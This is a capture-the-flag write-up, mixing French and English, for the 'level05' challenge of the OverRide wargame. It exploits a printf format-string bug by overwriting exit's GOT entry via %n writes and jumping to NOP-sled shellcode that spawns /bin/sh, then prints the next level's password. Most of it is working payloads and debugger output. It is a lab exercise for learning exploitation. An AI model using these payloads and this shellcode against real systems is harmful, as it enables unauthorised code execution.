# Level05

- Source code
    
    ```c
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      char s[100]; // [esp+28h] [ebp-70h] BYREF
      unsigned int i; // [esp+8Ch] [ebp-Ch]
    
      i = 0;
      fgets(s, 100, stdin);
      for ( i = 0; i < strlen(s); ++i )
      {
        if ( s[i] > 64 && s[i] <= 90 )
          s[i] ^= 0x20u;
      }
      printf(s);
      exit(0);
    }
    ```
    

fgets read 100 chars.

Les char entre 64 et 90 inclu sont additionne de 20.

On peut realiser un format string attack car la string est directement passe en parametre de printf

```c
level05@OverRide:~$ ./level05
AAAA %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20782520
```

Le offset est trouve : A (41) + 20 = 61

Le offset est de 10 words, soit (10 * 4) 40 bytes

On doit donc donner une addresse ou on peut ecrire ce qu’on veut 

```c
level05@OverRide:~$ gdb -q level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Starting program: /home/users/level05/level05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048449 in main ()
(gdb) x /200x $esp
[...]
0xffffd8e0:     0x61616161      0x61616161      0x48530061      0x3d4c4c45
0xffffd8f0:     0x6e69622f      0x7361622f      0x45540068      0x783d4d52
```

adresse de av[1] = 0xffffd8e0 + c (4 * 3) = 0xffffdf8c

On va donc passer ca en *av[1]* a notre programme (un simple ret2libc avec system + exit + “/bin/sh”)

```bash
python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x90\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')”
```

Nous allons write avec *%*n dans *0x080497e0* l’addresse de exit dans la *GOT* pour ecrire l’addresse de av[1] et executer notre *system()*

Lets’ find the GOT address of exit ([https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4))

```bash
(gdb) disas main
[...]
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
[...]
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
```

```bash
python -c "print('\xe0\x97\x04\x08' + '%10\$x')" |  ./level05 `python -c "print('\xd0\xae\xe6\xf7' + '\x90\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"`
```

We can print our addresse, now let’s overwrite it :

0xFFFFD8BC = 4294957244

```bash
python -c "print('\xe0\x97\x04\x08' + '%10\$n')" > /tmp/input
```

```bash
(gdb) run aaaa < /tmp/input
Starting program: /home/users/level05/level05 aaaa < /tmp/input
�

Breakpoint 1, 0x0804850c in main ()
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:       0x00000004
```

We know that we can overwrite and then seg. fault

```bash
python -c "print('\xe0\x97\x04\x08' + '%4294957248x' + '%10\$n')" > /tmp/input
```

The address we want to write is 0xffffdf8c, it’s to long

we are going to write 0xdf8c in 0x080497e0

and 0xffff in 0x080497e0 + 2

```bash
python -c "print(address + (address + 2) + '%(0xdf8c - 8)x' + '%10\$n'+ '%(0xffff - 0xdf8c)x' + '%11\$n')" > /tmp/test
```

address 1 = 0x080497e0

address 2 = 0x080497e2

x1 = 57,228 - 8 = 57,220

x2 = 0xffff - 0xdf8c = 8307

```bash
python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%57220x' + '%10\$n'+ '%8307x' + '%11\$n')" > /tmp/test
```

```bash
Program received signal SIGSEGV, Segmentation fault.
0xffffdf8c in ?? ()
```

Got it !

```bash
Starting program: /home/users/level05/level05 `python -c "print('\x90' * 100 + '\xd0\xae\xe6\xf7' + '\x90\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"` < /tmp/test
[...]
Breakpoint 1, 0x0804850c in main ()
(gdb) si
0x08048513 in main ()
(gdb)
0x08048370 in exit@plt ()
(gdb)
0xffffdf8c in ?? ()
(gdb)
0xffffdf8d in ?? ()
(gdb) x 0xffffdf8c
0xffffdf8c:     0x90909090
(gdb) ni
[...]
(gdb)
0xffffdfa2 in ?? ()
(gdb)

Program received signal SIGSEGV, Segmentation fault.
0xffffdfa2 in ?? ()
(gdb) x 0xffffdfa2
0xffffdfa2:     0xf7e6aed0
```

We try with a shellcode is way easier :

```bash
python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%57220x' + '%10\$n'+ '%8307x' + '%11\$n')" | env -i ./level05 `python -c "print('\x90' * 100 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31
\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')"`
```

Got it !

```bash
[...]
f7fcfac0
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```